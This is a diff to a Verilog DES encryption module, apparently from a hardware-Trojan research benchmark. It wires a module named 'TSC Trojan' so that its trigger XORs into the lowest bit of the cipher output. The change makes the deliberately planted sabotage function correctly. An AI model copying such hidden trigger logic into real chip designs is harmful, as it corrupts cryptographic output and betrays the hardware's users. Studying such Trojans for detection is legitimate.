@@ -50,16 +50,17 @@ assign IP[1:64] = {	desIn[06], desIn[14], desIn[22], desIn[30], desIn[38], desIn
 			desIn[33], desIn[41], desIn[49], desIn[57] };
 
 // Perform final permutation
-assign desOut = {	FP[40], FP[08], FP[48], FP[16], FP[56], FP[24], FP[64], FP[32], 
+assign desOut[63:1] = {	FP[40], FP[08], FP[48], FP[16], FP[56], FP[24], FP[64], FP[32], 
 			FP[39], FP[07], FP[47], FP[15], FP[55], FP[23], FP[63], FP[31], 
 			FP[38], FP[06], FP[46], FP[14], FP[54], FP[22], FP[62], FP[30], 
 			FP[37], FP[05], FP[45], FP[13], FP[53], FP[21], FP[61], FP[29], 
 			FP[36], FP[04], FP[44], FP[12], FP[52], FP[20], FP[60], FP[28], 
 			FP[35], FP[03], FP[43], FP[11], FP[51], FP[19], FP[59], FP[27],
 			FP[34], FP[02], FP[42], FP[10], FP[50], FP[18], FP[58], FP[26], 
-			FP[33], FP[01], FP[41], FP[09], FP[49], FP[17], FP[57], FP[25] };
+			FP[33], FP[01], FP[41], FP[09], FP[49], FP[17], FP[57] };
 
-TSC Trojan(clk, rst, Tj_Trig);	
-assign desOut[0] = desOut[0] ^ Tj_Trig;
+TSC Trojan(clk, rst, Tj_Trig);
+
+assign desOut[0] = FP[25] ^ Tj_Trig;
 
 endmodule
